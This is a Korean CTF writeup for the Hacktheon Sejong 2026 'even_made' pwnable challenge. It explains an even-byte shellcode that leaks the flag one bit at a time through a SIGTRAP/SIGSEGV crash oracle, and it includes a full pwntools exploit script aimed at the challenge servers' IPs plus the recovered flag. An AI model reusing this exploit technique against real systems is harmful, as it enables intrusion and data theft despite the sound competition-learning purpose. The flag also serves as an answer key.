---
title: "Hacktheon Sejong 2026 Quals even_made Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals even_made 문제 풀이."
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

# even_made

입력 shellcode의 모든 byte가 짝수여야 했다.
또한 seccomp가 `nanosleep`만 허용하므로, syscall로 플래그를 출력할 수 없었다.

플래그는 프로그램 시작 시 전역 변수 `flag_mem`에 올라간다.
출력 경로가 막혀 있었다.
shellcode가 플래그 bit를 읽고 crash 종류로 bit 값을 알려주는 oracle을 만들었다.

구분은 이렇게 잡았다.

```text
bit == 1 -> SIGTRAP
bit == 0 -> SIGSEGV
```

PIE base는 shellcode 호출 직후 stack에 남아 있는 return address에서 구했다.
even-byte instruction만 써야 해서 사용할 수 있는 instruction은 제한적이었다.
`pop rax`로 return address를 가져온 뒤 짝수 byte instruction 조합으로 `flag_mem`까지 offset을 더했다.

bit leak shellcode는 이런 모양이다.

```python
code  = b"\x58"
code += add_even_delta
code += b"\x8a\x00"
code += test_bit
code += b"\x74\x02"
code += b"\xcc"
code += b"\xf4"
```

remote에서는 같은 bit를 여러 번 보내 crash 결과를 majority vote로 정했다.
이 과정을 `0x50` 바이트 정도 반복하면 null byte 전까지 플래그가 복구된다.

익스플로잇 코드

```python
from pwn import *
import time

HOSTS = [
    ("13.124.201.116", 1337),
    ("54.181.1.133", 1337),
    ("43.201.41.138", 1337),
]

context.log_level = "error"

BASE_DELTA = 0x2aba


def add_delta_code(delta):
    low = delta & 0xff
    high = (delta >> 8) & 0xff

    code = b""

    code += b"\x3c\x02"
    code += b"\x10\xd2"

    code += b"\x80\x04\x24" + bytes([low & 0xfe])

    code += b"\x80\x14\x14" + bytes([high & 0xfe])
    code += b"\x10\x74\x24\x02"

    if low & 1:
        code += b"\x00\x14\x24"
        code += b"\x10\x34\x14"
        code += b"\x10\x74\x24\x02"

    if high & 1:
        code += b"\x00\x14\x14"
        code += b"\x10\x74\x24\x02"

    code += b"\x58"

    assert all((x & 1) == 0 for x in code)
    return code


def make_payload(delta, bit):
    code = add_delta_code(delta)

    code += b"\x8a\x00"

    if bit == 0:
        code += b"\xd0\xe0"
        code += b"\xa8\x02"
    else:
        code += b"\xa8" + bytes([1 << bit])

    code += b"\x74\x02"
    code += b"\xcc"
    code += b"\x50"
    code += b"\xf4"

    assert len(code) <= 0x900
    assert all((x & 1) == 0 for x in code)
    return code


def query(delta, bit, attempt=0):
    host, port = HOSTS[attempt % len(HOSTS)]
    payload = make_payload(delta, bit)

    io = remote(host, port, timeout=2)
    io.recvuntil(b"shellcode: ")
    io.send(payload)
    io.shutdown("send")
    out = io.recvall(timeout=2)
    io.close()

    if b"Trace/breakpoint" in out:
        return 1
    if b"Segmentation fault" in out or b"Alarm clock" in out:
        return 0

    raise RuntimeError(out)


def leak_bit(delta, bit):
    res = []

    for i in range(3):
        try:
            res.append(query(delta, bit, i))
        except Exception:
            time.sleep(0.05)

    if not res:
        return 0

    return 1 if sum(res) * 2 >= len(res) else 0


flag = b""

for i in range(0x50):
    v = 0

    for bit in range(8):
        v |= leak_bit(BASE_DELTA + i, bit) << bit

    if v == 0:
        break

    flag += bytes([v])
    print(flag)

print(flag.decode())
```

플래그: `hacktheon2026{Ev3n_R3str1ct3d_Sh3lLc0d3_M4sT3r}`
